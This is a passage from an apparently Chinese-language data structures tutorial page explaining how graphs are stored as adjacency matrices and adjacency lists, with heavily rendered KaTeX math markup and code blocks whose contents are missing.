encoding="application/x-tex">V_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">V_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 不相连，则通常用 ∞ 来代表这两个顶点之间不存在边：</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>w</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>若</mtext><mo stretchy="false">(</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mtext>或</mtext><mo>&lt;</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo>&gt;</mo><mtext>是</mtext><mi>E</mi><mo stretchy="false">(</mo><mi>G</mi><mo stretchy="false">)</mo><mtext>中的边</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mtext>或</mtext><mi mathvariant="normal">∞</mi><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>若</mtext><mo stretchy="false">(</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mtext>或</mtext><mo>&lt;</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo>&gt;</mo><mtext>不是</mtext><mi>E</mi><mo stretchy="false">(</mo><mi>G</mi><mo stretchy="false">)</mo><mtext>中的边</mtext></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">
A[i][j] = \begin{cases}
  w_{ij}, &amp; \text{若} (v_{i}, v_{j}) \text{或} &lt;v_{i}, v_{j}&gt; \text{是} E(G) \text{中的边} \\
  0 \text{或} \infty, &amp; \text{若} (v_{i}, v_{j}) \text{或} &lt;v_{i}, v_{j}&gt; \text{不是} E(G) \text{中的边}
\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mord text"><span class="mord cjk_fallback">或</span></span><span class="mord">∞</span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">若</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord text"><span class="mord cjk_fallback">或</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord text"><span class="mord cjk_fallback">是</span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal">G</span><span class="mclose">)</span><span class="mord text"><span class="mord cjk_fallback">中的边</span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">若</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord text"><span class="mord cjk_fallback">或</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord text"><span class="mord cjk_fallback">不是</span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal">G</span><span class="mclose">)</span><span class="mord text"><span class="mord cjk_fallback">中的边</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>图的邻接矩阵存储结构定义如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container tip">
<p class="hint-container-title">提示</p>
<ul>
<li>在简单应用中，可直接用二维数组作为图的邻接矩阵（顶点信息等均可省略）</li>
<li>当邻接矩阵的元素仅表示相应边是否存在时，EdgeType 可采用值为 <code>0</code> 和 <code>1</code> 的枚举类型</li>
<li>无向图的邻接矩阵是对称矩阵，对规模特大的邻接矩阵可采用压缩存储</li>
<li>邻接矩阵表示法的空间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 为图的顶点数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>V</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|V|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord">∣</span></span></span></span></li>
</ul>
</div>
<p>图的邻接矩阵存储表示法具有以下特定：</p>
<ul>
<li>无向图的邻接矩阵一定是一个对称矩阵（并且唯一）。因此，在实际存储邻接矩阵时只需存储上（或下）三角矩阵的元素</li>
<li>对于无向图，邻接矩阵的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 行（或第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 列）非零元素（或非 ∞ 元素）的个数正好是顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 的度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>D</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TD(v_{i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li>对于有向图，邻接矩阵的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 行非零元素（或非 ∞ 元素）的个数正好是顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 的出度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mi>D</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">OD(v_{i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>；第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 列非零元素（或非 ∞ 元素）的个数正好是顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 的入度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>D</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ID(v_{i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li>用邻接矩阵存储图，很容易确定图中任意两个顶点之间是否有边相连。但是，要确定图中有多少条边，则必须按行、按列对每个元素进行检测，所花费的时间代价很大</li>
<li>稠密图适合使用邻接矩阵的存储表示</li>
<li>设图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 的邻接矩阵为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">A_{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的元素 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>n</mi></msub><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">A_{n}[i][j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 等于由顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 的长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的路径的数目</li>
</ul>
<h4> 邻接表法</h4>
<p>当一个图为稀疏图时，使用邻接矩阵法显然要浪费大量的存储空间，而图的邻接表法结合了顺序存储和链式存储方法，大大减少了这种不必要的浪费。</p>
<p>所谓邻接表，是指对图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中的每个顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，建立一个单链表，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个单链表中的结点表示依附于顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的边（对于有向图则是以顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为尾的弧），这个单链表就称为顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的 <strong>边表</strong>（对于有向图则称为 <strong>出边表</strong>）。边表的头指针和顶点的数据信息采用顺序存储（称为 <strong>顶点表</strong>），所以在邻接表中存在两种结点：顶点表结点和边表结点。</p>
<p>顶点表结点由顶点域（data）和指向第一条邻接边的指针（firstarc）构成，边表（邻接表）结点由邻接点域（adjvex）和指向下一条邻接边的指针域（nextarc）构成。</p>
<p>图的邻接表存储结构定义如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>图的邻接表存储方法具有以下特点：</p>
<ul>
